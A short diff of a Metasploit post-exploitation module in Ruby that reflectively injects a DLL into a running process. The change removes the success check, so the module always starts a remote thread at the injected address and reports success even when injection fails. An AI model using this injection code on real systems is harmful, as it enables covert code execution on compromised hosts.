@@ -45,13 +45,9 @@ class Metasploit3 < Msf::Post
     print_status("Injecting #{datastore['PATH']} into #{pid} ...")
     dll_mem, offset = inject_dll_into_process(host_process, datastore['PATH'])
 
-    if dll_mem && offset
-      print_status("DLL injected. Executing ReflectiveLoader ...")
-      host_process.thread.create(dll_mem + offset, 0)
-      print_good("DLL injected and invoked.")
-    else
-      print_error("DLL doesn't appear to be reflectively injectable.")
-    end
+    print_status("DLL injected. Executing ReflectiveLoader ...")
+    host_process.thread.create(dll_mem + offset, 0)
+    print_good("DLL injected and invoked.")
   end
 end
 
